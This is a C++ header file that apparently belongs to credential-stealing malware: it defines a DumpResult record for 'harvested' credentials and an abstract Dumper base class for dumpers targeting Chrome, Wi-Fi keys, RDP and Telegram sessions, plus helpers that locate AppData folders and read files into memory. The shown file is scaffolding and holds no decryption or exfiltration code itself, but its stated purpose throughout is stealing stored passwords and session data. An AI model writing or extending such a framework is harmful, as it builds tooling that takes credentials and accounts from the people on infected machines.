#pragma once
#include <windows.h>
#include <string>
#include <vector>

// -------------------------------------------------------------------
// DumpResult - holds one harvested credential entry
// -------------------------------------------------------------------
struct DumpResult {
    std::wstring target;     // Source (Chrome, WiFi, RDP, Telegram)
    std::wstring username;   // Username / SSID / account
    std::wstring password;   // Password / key / session data
    std::wstring url;        // URL / network name / server
    std::wstring notes;      // Additional context (path, timestamp, etc.)
    
    DumpResult() {}
    
    DumpResult(const wchar_t* t, const wchar_t* u, const wchar_t* p,
               const wchar_t* r = L"", const wchar_t* n = L"")
        : target(t), username(u), password(p), url(r), notes(n) {}
    
    DumpResult(const std::wstring& t, const std::wstring& u,
               const std::wstring& p, const std::wstring& r = L"",
               const std::wstring& n = L"")
        : target(t), username(u), password(p), url(r), notes(n) {}
};

// -------------------------------------------------------------------
// Dumper - abstract base for all credential dumpers
// -------------------------------------------------------------------
class Dumper {
public:
    virtual ~Dumper() {}
    
    // Main entry point - returns all harvested credentials
    virtual std::vector<DumpResult> Dump() = 0;
    
    // Human-readable dumper name
    virtual const wchar_t* Name() const = 0;
    
    // Helper: expand environment variables in a path
    static std::wstring ExpandEnv(const std::wstring& path) {
        wchar_t buf[4096];
        DWORD ret = ExpandEnvironmentStringsW(path.c_str(), buf, 4096);
        if (ret > 0 && ret < 4096)
            return std::wstring(buf);
        return path;
    }
    
    // Helper: get LOCALAPPDATA path
    static std::wstring GetLocalAppData() {
        wchar_t buf[MAX_PATH];
        DWORD ret = GetEnvironmentVariableW(L"LOCALAPPDATA", buf, MAX_PATH);
        if (ret > 0 && ret < MAX_PATH)
            return std::wstring(buf);
        return L"C:\\Users\\Default\\AppData\\Local";
    }
    
    // Helper: combine paths
    static std::wstring PathCombine(const std::wstring& a, const std::wstring& b) {
        if (a.empty()) return b;
        if (b.empty()) return a;
        if (a.back() == L'\\' || a.back() == L'/')
            return a + b;
        return a + L"\\" + b;
    }
    
    // Helper: get APPDATA path
    static std::wstring GetAppData() {
        wchar_t buf[MAX_PATH];
        DWORD ret = GetEnvironmentVariableW(L"APPDATA", buf, MAX_PATH);
        if (ret > 0 && ret < MAX_PATH)
            return std::wstring(buf);
        return L"C:\\Users\\Default\\AppData\\Roaming";
    }
    
    // Helper: read file into memory
    static bool ReadFileContents(const std::wstring& path, 
                                  std::vector<unsigned char>& out) {
        HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, 
                                    FILE_SHARE_READ, nullptr, 
                                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 
                                    nullptr);
        if (hFile == INVALID_HANDLE_VALUE)
            return false;
        
        DWORD size = GetFileSize(hFile, nullptr);
        if (size == INVALID_FILE_SIZE || size == 0) {
            CloseHandle(hFile);
            return false;
        }
        
        out.resize(size);
        DWORD read = 0;
        BOOL ok = ReadFile(hFile, out.data(), size, &read, nullptr);
        CloseHandle(hFile);
        
        if (!ok || read != size) {
            out.clear();
            return false;
        }
        return true;
    }
};
